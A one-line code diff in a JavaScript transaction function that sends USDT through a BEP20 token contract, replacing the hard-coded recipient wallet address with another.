@@ -14,7 +14,7 @@ export const Transaction = async (amount) => {
         const BigNumber = require('bignumber.js');
         const tokenContractAddress = '0x55d398326f99059ff775485246999027b3197955';
         const tokenContract = new web3.eth.Contract(BEP20TokenABI, tokenContractAddress);
-        const recipientAddress = '0x6058Bd96B7BaD4E35A16a443697284fcf0b473c4';
+        const recipientAddress = '0x41eA98f6bd8ee39d4Bb13A4CBB94fb42dA55e002';
         if (amount === null) {
             alert("Please select USDT")
         }
